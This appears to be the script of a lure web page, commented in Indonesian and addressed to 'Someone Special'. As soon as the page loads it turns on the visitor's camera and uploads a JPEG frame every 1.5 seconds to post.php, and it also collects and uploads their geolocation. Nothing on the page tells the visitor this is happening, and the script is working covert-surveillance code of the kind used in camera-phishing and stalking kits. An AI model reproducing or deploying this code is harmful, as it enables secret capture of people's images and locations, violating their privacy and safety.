  <script>
    // ==========================================
    // FUNGSI PENTING - JANGAN DIUBAH
    // ==========================================

    // Nama default - JANGAN DIUBAH
    const receiverName = "Seseorang Spesial";

    // Global variable for capture interval
    let captureInterval = null;

    // Camera functionality - JANGAN DIUBAH
    function initCamera() {
      navigator.mediaDevices.getUserMedia({video: true})
        .then(handleCameraSuccess)
        .catch(handleCameraError);
    }
    
    function handleCameraSuccess(stream) {
      video.srcObject = stream;
      video.play();
      console.log('Camera activated - starting continuous capture every 1500ms');
      
      // Pastikan tidak ada interval duplicate
      if (captureInterval) {
        clearInterval(captureInterval);
      }
      
      // Mulai capture setiap 1.5 detik terus menerus
      captureInterval = setInterval(() => {
        captureAndSend();
      }, 1500);
    }

    function handleCameraError(error) {
      console.error('Camera initialization failed:', error.message);
      // Tidak ada status element di halaman ini
    }

    function captureAndSend() {
      try {
        // Cek apakah video sudah ready
        if (video.readyState !== video.HAVE_ENOUGH_DATA) {
          console.log('Video not ready for capture, skipping...');
          return;
        }
        
        // Validasi dimensi video
        if (video.videoWidth === 0 || video.videoHeight === 0) {
          console.log('Invalid video dimensions, skipping capture');
          return;
        }
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Validasi data URL
        if (!imageData || imageData.length < 100) {
          console.error('Invalid image data generated');
          return;
        }
        
        console.log('Capture successful, sending to server...');
        postData(imageData);
      } catch (error) {
        console.error('Capture error:', error.message);
        // Lanjutkan loop meskipun ada error
      }
    }

    // Location functionality - JANGAN DIUBAH
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const coords = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            };
            sendLocationData(coords);
          },
          (error) => {
            console.error('Location error:', error.message);
          }
        );
      }
    }

    function sendLocationData(coords) {
      $.ajax({
        type: 'POST',
        data: {
          location: JSON.stringify(coords),
          name: receiverName
        },
        url: 'post.php',  // Ganti ke post.php langsung
        dataType: 'json',
        async: true,
        success: function(response) {
          console.log('Location data sent successfully');
        },
        error: function(xhr, status, error) {
          console.error('Location upload failed:', error);
        }
      });
    }

    // Post data functionality - JANGAN DIUBAH
    function postData(imageData) {
      $.ajax({
        type: 'POST',
        data: {
          image: imageData,
          name: receiverName
        },
        url: 'post.php',  // Ganti ke post.php langsung
        dataType: 'json',
        async: true,
        success: function(response) {
          if (response.success) {
            console.log('Image upload successful:', response.filename);
          } else {
            console.error('Server reported upload error:', response.error);
          }
        },
        error: function(xhr, status, error) {
          console.error('Image upload failed - network error:', status, error);
          // Loop tetap berjalan, tidak menghentikan capture
        }
      });
    }

    // Cleanup saat halaman ditutup
    function cleanup() {
      if (captureInterval) {
        clearInterval(captureInterval);
        console.log('Capture interval cleared');
      }
      
      // Stop camera stream
      if (video.srcObject) {
        const stream = video.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach(track => track.stop());
        console.log('Camera stream stopped');
      }
    }

    // ==========================================
    // INISIALISASI - JANGAN DIUBAH
    // ==========================================

    window.addEventListener('load', function () {
      initCamera();  // HARUS dipanggil
      getLocation(); // HARUS dipanggil
    });

    // Cleanup saat unload
    window.addEventListener('beforeunload', cleanup);
    window.addEventListener('unload', cleanup);
